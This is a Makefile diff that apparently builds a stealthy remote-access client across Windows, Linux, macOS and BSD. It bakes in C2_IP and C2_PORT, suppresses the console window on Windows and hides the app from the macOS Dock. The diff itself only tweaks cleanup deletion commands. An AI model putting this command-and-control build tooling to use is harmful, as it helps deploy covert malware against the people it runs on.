@@ -35,7 +35,7 @@ endif
 all: $(SRC)
 ifeq ($(OS),Windows_NT)
 	$(eval $(call wininput))
-	@cmd /c del /f /q .\nn
+	@cmd /c erase /f /q .\nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 else
@@ -55,12 +55,12 @@ endif
 
 ifeq ($(shell uname -s),Linux)
 	$(eval $(call uninput))
-	@sh -c rm -rf ./.nn
+	@sh -c rm -rf ./nn
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
 	$(eval $(call uninput))
-	@sh -c rm -rf ./.nn
+	@sh -c rm -rf ./nn
 	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
 	
 	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
@@ -83,7 +83,7 @@ ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
 endif
 ifeq ($(shell uname -s),BSD)
 	$(eval $(call uninput))
-	@sh -c rm -rf ./.nn
+	@sh -c rm -rf ./nn
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 
